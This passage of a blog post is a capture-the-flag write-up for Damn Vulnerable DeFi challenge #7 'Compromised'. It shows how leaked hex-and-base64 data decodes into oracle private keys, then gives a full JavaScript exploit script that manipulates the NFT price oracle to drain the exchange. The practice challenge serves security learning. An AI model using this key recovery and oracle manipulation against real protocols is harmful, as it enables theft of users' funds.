+<li><code>0xe92401A4d3af5E446d93D11EEc806b1462b39D15</code></li>
+<li><code>0x81A5D6E50C214044bE44cA0CB057fe119097850c</code></li>
+</ul>
+<p>This contract has multiple functions:</p>
+<ul>
+<li><code>setupInitialPrices</code> function allows addresses with role <code>TRUSTED_SOURCE_ROLE</code> to set the initial price (line <code>61</code>). This function is called by <code>TrustfulOracleInitializer</code> contract (line <code>23</code>) with initial price of <code>999 ETH</code> (<a href="https://github.com/tinchoabbate/damn-vulnerable-defi/blob/master/test/compromised/compromised.challenge.js#L50" target="_blank" rel="noopener noreffer ">setup</a>)</li>
+<li><code>postPrice</code> function allows addresses with the role <code>TRUSTED_SOURCE_ROLE</code> to set the price of a token. This function calls the <code>_setPrice</code> (line <code>67</code>). The price set by each trusted source is stored in the <code>pricesBySource</code> variable (line <code>96</code>)</li>
+<li><code>getMedianPrice</code> is the external function used to retrieve the median price of an NFT token. It calls the private function<code>_computeMedianPrice</code> (line <code>71</code>)</li>
+<li><code>_computeMedianPrice</code> is the function responsible for computing the median price. It first calls <code>getAllPricesForSymbol</code> (line <code>101</code>) to get all the prices for that specific token symbol (lines <code>75-83</code>) and then sort the sort these prices by calling the <code>_sort</code> function (line <code>101</code>). Once all the prices are reetrived, it computes the median price to return (lines <code>104-109</code>).</li>
+</ul>
+<p>If we want to change the NFT price, we need to set at least the price of <code>2</code> different NFT tokens.</p>
+<h3 id="24-server-data">2.4) Server Data</h3>
+<p>So far, we know that:</p>
+<ul>
+<li>to change the price of an NFT, we need to have the <code>TRUSTED_SOURCE_ROLE</code> role</li>
+<li>there are <code>3</code> addresses that have this role</li>
+<li>if we can lower the price of an NFT and buy at least one and later change the price of the NFT to be equal to the exchange balance and then sell that NFT token, we will be able to steal all the exchange balance</li>
+</ul>
+<p>Since the only way to alter the NFT price is with one of the <code>3</code> addresses. Let&rsquo;s investigate the data provided in this challenge to see if it&rsquo;s related to one or more of these addresses. For example, to send a transaction on behalf of one or more of these addresses, we should know their private keys.</p>
+<p>I could not easily understand what the data was about initially, and neither found some patterns. The only common thing I noticed is that both data arrays start with <code>4d48</code>, but other than that, I had no clue about what this data was or how you can derive something that looks like a private key.</p>
+<p>I first tried to decode this data using a brute-force approach by trying different encodings and seeing if the data returned had any sense.</p>
+<p>I tried with the first array of bytes:
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#00f">let</span> <span style="color:#000">data</span> = <span style="color:#5a2">&#34;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&#34;</span>.<span style="color:#000">replaceAll</span>(<span style="color:#5a2">&#34; &#34;</span>, <span style="color:#5a2">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">let</span> <span style="color:#000">encodings</span> = [<span style="color:#5a2">&#39;hex&#39;</span>, <span style="color:#5a2">&#39;ascii&#39;</span>, <span style="color:#5a2">&#39;base64&#39;</span>, <span style="color:#5a2">&#39;binary&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">for</span> (<span style="color:#00f">const</span> <span style="color:#000">enc1</span> <span style="color:#00f">of</span> <span style="color:#000">encodings</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">let</span> <span style="color:#000">d1</span> = <span style="color:#000">Buffer</span>.<span style="color:#000">from</span>(<span style="color:#000">data</span>, <span style="color:#000">enc1</span>).<span style="color:#000">toString</span>(<span style="color:#5a2">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">`\n</span><span style="color:#5a2">${</span><span style="color:#000">enc1</span><span style="color:#5a2">}</span><span style="color:#5a2">:\n</span><span style="color:#5a2">${</span><span style="color:#000">d1</span><span style="color:#5a2">}</span><span style="color:#5a2">`</span>)
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p>Observing the output, none of the data makes much sense, so I tried to encode it again:
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#00f">for</span> (<span style="color:#00f">const</span> <span style="color:#000">enc1</span> <span style="color:#00f">of</span> <span style="color:#000">encodings</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">let</span> <span style="color:#000">d1</span> = <span style="color:#000">Buffer</span>.<span style="color:#000">from</span>(<span style="color:#000">data</span>, <span style="color:#000">enc1</span>).<span style="color:#000">toString</span>(<span style="color:#5a2">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">`\n</span><span style="color:#5a2">${</span><span style="color:#000">enc1</span><span style="color:#5a2">}</span><span style="color:#5a2">:\n</span><span style="color:#5a2">${</span><span style="color:#000">d1</span><span style="color:#5a2">}</span><span style="color:#5a2">`</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">for</span> (<span style="color:#00f">const</span> <span style="color:#000">enc2</span> <span style="color:#00f">of</span> <span style="color:#000">encodings</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">if</span> (<span style="color:#000">enc1</span> != <span style="color:#000">enc2</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">let</span> <span style="color:#000">d2</span> = <span style="color:#000">Buffer</span>.<span style="color:#000">from</span>(<span style="color:#000">d1</span>, <span style="color:#000">enc2</span>).<span style="color:#000">toString</span>(<span style="color:#5a2">&#34;utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">`+ </span><span style="color:#5a2">${</span><span style="color:#000">enc2</span><span style="color:#5a2">}</span><span style="color:#5a2">:\n</span><span style="color:#5a2">${</span><span style="color:#000">d2</span><span style="color:#5a2">}</span><span style="color:#5a2">`</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p>Looking at the output, I noticed something that looked like a private key. It resulted from the following encodings: <code>hex</code> and then <code>base64</code>.</p>
+<p>Now we need to check if these are private keys or not and if they belong to one or more of the <code>3</code> trusted oracles addresses.
+To do this check, I imported these potential private keys into a wallet, got the addresses, and checked if these addresses corresponded to those of the trusted oracles.</p>
+<p>It turns out that the two byte arrays are the private keys of the following trusted oracles:</p>
+<ul>
+<li><code>0xe92401A4d3af5E446d93D11EEc806b1462b39D15</code></li>
+<li><code>0x81A5D6E50C214044bE44cA0CB057fe119097850c</code></li>
+</ul>
+<p>At this point, we can send transactions using these two addresses and thus alter the NFT price.</p>
+<h2 id="3-solution">3) Solution</h2>
+<p>The solution consists of the following steps:</p>
+<ul>
+<li>lower the price of the <code>DVNFT</code> to <code>0</code> using <code>2</code> of the <code>3</code> compromised oracle sources</li>
+<li>buy a <code>DVNFT</code> with our attacker address (we need to send a value that is <code>&gt;</code> than <code>0</code>)</li>
+<li>set the price of the <code>DVNFT</code> to be equal to the exchange balance  using <code>2</code> of the <code>3</code> compromised oracle sources</li>
+<li>approve the exchange to transfer our NFT token</li>
+<li>sell the token: this way, since the price of the NFT token will be equal to the exchange balance, we&rsquo;ll receive all of its balance</li>
+<li>set the initial NFT token price</li>
+</ul>
+<p><code>compromised.challenge.js</code>:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#00f">async</span> <span style="color:#00f">function</span> () {        
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">/** CODE YOUR EXPLOIT HERE */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">const</span> <span style="color:#000">eth</span> = <span style="color:#000">ethers</span>.<span style="color:#000">utils</span>.<span style="color:#000">parseEther</span>(<span style="color:#5a2">&#39;0.01&#39;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">provider</span> = <span style="color:#000">attacker</span>.<span style="color:#000">provider</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">data</span> = [
+</span></span><span style="display:flex;"><span>            <span style="color:#5a2">&#34;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#5a2">&#34;4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34&#34;</span>
+</span></span><span style="display:flex;"><span>        ];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">const</span> <span style="color:#000">signers</span> = <span style="color:#000">data</span>
+</span></span><span style="display:flex;"><span>            .<span style="color:#000">map</span>(<span style="color:#000">d</span> =&gt; <span style="color:#000">d</span>.<span style="color:#000">replaceAll</span>(<span style="color:#5a2">&#34; &#34;</span>, <span style="color:#5a2">&#34;&#34;</span>))
+</span></span><span style="display:flex;"><span>            .<span style="color:#000">map</span>(<span style="color:#000">d</span> =&gt; <span style="color:#000">Buffer</span>.<span style="color:#000">from</span>(<span style="color:#000">d</span>, <span style="color:#5a2">&#34;hex&#34;</span>).<span style="color:#000">toString</span>(<span style="color:#5a2">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>            .<span style="color:#000">map</span>(<span style="color:#000">d</span> =&gt; <span style="color:#000">Buffer</span>.<span style="color:#000">from</span>(<span style="color:#000">d</span>, <span style="color:#5a2">&#34;base64&#34;</span>).<span style="color:#000">toString</span>(<span style="color:#5a2">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>            .<span style="color:#000">map</span>(<span style="color:#000">d</span> =&gt; <span style="color:#00f">new</span> <span style="color:#000">ethers</span>.<span style="color:#000">Wallet</span>(<span style="color:#000">d</span>, <span style="color:#000">provider</span>))
+</span></span><span style="display:flex;"><span>            .<span style="color:#000">filter</span>(<span style="color:#000">signer</span> =&gt; <span style="color:#000">sources</span>.<span style="color:#000">includes</span>(<span style="color:#000">signer</span>.<span style="color:#000">address</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// lower the price
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#00f">for</span> (<span style="color:#00f">const</span> <span style="color:#000">signer</span> <span style="color:#00f">of</span> <span style="color:#000">signers</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">oracle</span>.<span style="color:#000">connect</span>(<span style="color:#000">signer</span>).<span style="color:#000">postPrice</span>(<span style="color:#5a2">&#34;DVNFT&#34;</span>, <span style="color:#3af">0</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// buy one
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">exchange</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">buyOne</span>({ <span style="color:#000">value</span>: <span style="color:#000">eth</span> });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// set the price equal to the exchange balance
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#00f">for</span> (<span style="color:#00f">const</span> <span style="color:#000">signer</span> <span style="color:#00f">of</span> <span style="color:#000">signers</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">oracle</span>.<span style="color:#000">connect</span>(<span style="color:#000">signer</span>).<span style="color:#000">postPrice</span>(<span style="color:#5a2">&#34;DVNFT&#34;</span>, <span style="color:#000">EXCHANGE_INITIAL_ETH_BALANCE</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// sell one
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">nftToken</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">approve</span>(<span style="color:#00f">this</span>.<span style="color:#000">exchange</span>.<span style="color:#000">address</span>, <span style="color:#3af">0</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">exchange</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">sellOne</span>(<span style="color:#3af">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">// set the initial price
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span>        <span style="color:#00f">for</span> (<span style="color:#00f">const</span> <span style="color:#000">signer</span> <span style="color:#00f">of</span> <span style="color:#000">signers</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">oracle</span>.<span style="color:#000">connect</span>(<span style="color:#000">signer</span>).<span style="color:#000">postPrice</span>(<span style="color:#5a2">&#34;DVNFT&#34;</span>, <span style="color:#000">INITIAL_NFT_PRICE</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>You can find the complete code <a href="https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/compromised/compromised.challenge.js" target="_blank" rel="noopener noreffer ">here</a>.</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on September 18, 2022</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_07_compromised/" data-title="Damn Vulnerable DeFi - Challenge #7 - Compromised" data-via="_d3lla_" data-hashtags="Damn Vulnerable DeFi,CTF,Solidity,Blockchain"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_07_compromised/" data-hashtag="Damn Vulnerable DeFi"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_07_compromised/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/damn-vulnerable-defi/">Damn Vulnerable DeFi</a>,&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/solidity/">Solidity</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/damnvulnerabledefi_06_selfie/" class="prev" rel="prev" title="Damn Vulnerable DeFi - Challenge #6 - Selfie"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Damn Vulnerable DeFi - Challenge #6 - Selfie</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://dellalibera.github.io/about/" target="_blank">della</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/css/e2eb86.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
